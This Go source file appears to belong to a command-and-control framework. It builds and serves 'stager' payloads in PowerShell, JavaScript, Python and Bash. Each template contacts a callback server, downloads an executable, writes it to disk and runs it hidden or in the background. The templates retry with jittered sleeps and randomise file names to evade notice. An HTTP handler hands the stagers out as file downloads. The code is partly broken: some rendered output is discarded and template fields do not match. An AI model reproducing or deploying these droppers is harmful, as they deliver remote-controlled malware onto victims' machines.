package stagers

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"text/template"
	"io"
	"Groxy/logger"
)

// StagerType defines different agent delivery methods
type StagerType int

const (
	StagerPowershell StagerType = iota
	StagerHTA
	StagerMacro
	StagerJavaScript
	StagerPython
	StagerBash
)

// StagerConfig holds configuration for stager generation
type StagerConfig struct {
	Type          StagerType
	CallbackURL   string
	AgentKey      string
	Obfuscation   bool
	SleepTime     int
	JitterPercent int
	CustomVars    map[string]string
}

// StagerManager handles creation and serving of stager payloads
type StagerManager struct {
	templates map[StagerType]*template.Template
	config    map[string]StagerConfig // Maps stager IDs to configs
}

// NewStagerManager creates a new stager manager
func NewStagerManager() *StagerManager {
	manager := &StagerManager{
		templates: make(map[StagerType]*template.Template),
		config:    make(map[string]StagerConfig),
	}
	
	// Initialize templates
	psTemplate := `
$k='{{.AgentKey}}';$i={{.SleepTime}};$j={{.JitterPercent}};$u='{{.CallbackURL}}';
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{{.Payload}}"));
$f="{{if .Obfuscation}}$(Get-Random){{else}}agent{{end}}.exe";
while($true){try{$r=Invoke-WebRequest -Uri $u -Method POST -Headers @{"X-Agent-Key"=$k};
[IO.File]::WriteAllBytes($f,$s);Start-Process $f -WindowStyle Hidden;break}
catch{Start-Sleep -Seconds ($i+(Get-Random -Minimum 0 -Maximum ($i*$j/100)))}}
`
	
	jsTemplate := `
var key = '{{.AgentKey}}';
var callback = '{{.CallbackURL}}';
var sleep = {{.SleepTime}};
var jitter = {{.JitterPercent}};

function downloadAgent() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', callback, true);
    xhr.setRequestHeader('X-Agent-Key', key);
    xhr.responseType = 'arraybuffer';
    
    xhr.onload = function() {
        if (this.status === 200) {
            var blob = new Blob([this.response], {type: 'application/octet-stream'});
            var a = document.createElement('a');
            a.style = 'display: none';
            document.body.appendChild(a);
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = '{{if .Obfuscation}}' + Math.random().toString(36).substring(7) + '{{else}}agent{{end}}.exe';
            a.click();
            window.URL.revokeObjectURL(url);
        } else {
            setTimeout(downloadAgent, sleep * 1000 * (1 + (Math.random() * jitter / 100)));
        }
    };
    
    xhr.onerror = function() {
        setTimeout(downloadAgent, sleep * 1000 * (1 + (Math.random() * jitter / 100)));
    };
    
    xhr.send();
}

downloadAgent();
`
	
	pythonTemplate := `
import requests
import time
import random
import base64
import os
import subprocess
import sys
import tempfile

KEY = '{{.AgentKey}}'
CALLBACK = '{{.CallbackURL}}'
SLEEP = {{.SleepTime}}
JITTER = {{.JitterPercent}}

def download_agent():
    headers = {'X-Agent-Key': KEY}
    
    while True:
        try:
            r = requests.post(CALLBACK, headers=headers)
            if r.status_code == 200:
                tmp = tempfile.gettempdir()
                agent_name = '{{if .Obfuscation}}' + ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8)) + '{{else}}agent{{end}}.exe'
                agent_path = os.path.join(tmp, agent_name)
                
                with open(agent_path, 'wb') as f:
                    f.write(r.content)
                
                if sys.platform.startswith('win'):
                    subprocess.Popen([agent_path], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    os.chmod(agent_path, 0o755)
                    subprocess.Popen([agent_path])
                
                break
        except Exception:
            jitter_time = SLEEP + (random.random() * SLEEP * JITTER / 100)
            time.sleep(jitter_time)

if __name__ == '__main__':
    download_agent()
`
	
	bashTemplate := `#!/bin/bash

KEY="{{.AgentKey}}"
CALLBACK="{{.CallbackURL}}"
SLEEP={{.SleepTime}}
JITTER={{.JitterPercent}}

download_agent() {
    while true; do
        response=$(curl -s -X POST -H "X-Agent-Key: $KEY" "$CALLBACK")
        if [ $? -eq 0 ]; then
            {{if .Obfuscation}}
            AGENT_NAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
            {{else}}
            AGENT_NAME="agent"
            {{end}}
            
            echo "$response" | base64 -d > /tmp/$AGENT_NAME
            chmod +x /tmp/$AGENT_NAME
            /tmp/$AGENT_NAME &
            break
        else
            # Calculate sleep with jitter
            JITTER_TIME=$(echo "$SLEEP + ($RANDOM % ($SLEEP * $JITTER / 100))" | bc)
            sleep $JITTER_TIME
        fi
    done
}

download_agent
`
	
	manager.templates[StagerPowershell] = template.Must(template.New("powershell").Parse(psTemplate))
	manager.templates[StagerJavaScript] = template.Must(template.New("javascript").Parse(jsTemplate))
	manager.templates[StagerPython] = template.Must(template.New("python").Parse(pythonTemplate))
	manager.templates[StagerBash] = template.Must(template.New("bash").Parse(bashTemplate))
	
	return manager
}

// CreateStager generates a new stager with the given configuration
func (sm *StagerManager) CreateStager(config StagerConfig) (string, error) {
	template, exists := sm.templates[config.Type]
	if !exists {
		return "", fmt.Errorf("unsupported stager type: %d", config.Type)
	}
	
	// Generate a unique ID for this stager
	idBytes := make([]byte, 8)
	if _, err := rand.Read(idBytes); err != nil {
		return "", err
	}
	stagerID := hex.EncodeToString(idBytes)
	
	// Store the config
	sm.config[stagerID] = config
	
	// Generate a dummy payload for template rendering
	// In a real implementation, this would be your actual agent payload
	dummyPayload := make([]byte, 64)
	rand.Read(dummyPayload)
	config.CustomVars = make(map[string]string)
	config.CustomVars["Payload"] = base64.StdEncoding.EncodeToString(dummyPayload)
	
	// Render the template
	var buf bytes.Buffer
	if err := template.Execute(&buf, config); err != nil {
		return "", err
	}
	
	return stagerID, nil
}

// GetStager retrieves a generated stager by ID
func (sm *StagerManager) GetStager(id string) (string, string, error) {
	config, exists := sm.config[id]
	if !exists {
		return "", "", fmt.Errorf("stager not found: %s", id)
	}
	
	template, exists := sm.templates[config.Type]
	if !exists {
		return "", "", fmt.Errorf("template not found for stager type: %d", config.Type)
	}
	
	// Generate the actual agent payload here, for demonstration we use dummy data
	dummyPayload := make([]byte, 64)
	rand.Read(dummyPayload)
	config.CustomVars = make(map[string]string)
	config.CustomVars["Payload"] = base64.StdEncoding.EncodeToString(dummyPayload)
	
	var buf bytes.Buffer
	if err := template.Execute(&buf, config); err != nil {
		return "", "", err
	}
	
	// Determine content type based on stager type
	var contentType string
	switch config.Type {
	case StagerPowershell:
		contentType = "text/plain"
	case StagerJavaScript:
		contentType = "application/javascript"
	case StagerPython:
		contentType = "text/x-python"
	case StagerBash:
		contentType = "text/x-shellscript"
	default:
		contentType = "text/plain"
	}
	
	return buf.String(), contentType, nil
}

// ServeStager handles HTTP requests for stagers
func (sm *StagerManager) ServeStager(w http.ResponseWriter, r *http.Request) {
	// Extract stager ID from the request path
	path := strings.TrimPrefix(r.URL.Path, "/stagers/")
	if path == "" {
		http.Error(w, "Stager ID required", http.StatusBadRequest)
		return
	}
	
	stagerContent, contentType, err := sm.GetStager(path)
	if err != nil {
		logger.Error("Failed to retrieve stager %s: %v", path, err)
		http.Error(w, "Stager not found", http.StatusNotFound)
		return
	}
	
	// Serve the stager
	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=stager%s", getExtension(contentType)))
	io.WriteString(w, stagerContent)
	
	logger.Info("Served stager %s with content type %s", path, contentType)
}

// Helper to determine file extension based on content type
func getExtension(contentType string) string {
	switch contentType {
	case "text/plain":
		return ".ps1"
	case "application/javascript":
		return ".js"
	case "text/x-python":
		return ".py"
	case "text/x-shellscript":
		return ".sh"
	default:
		return ".txt"
	}
}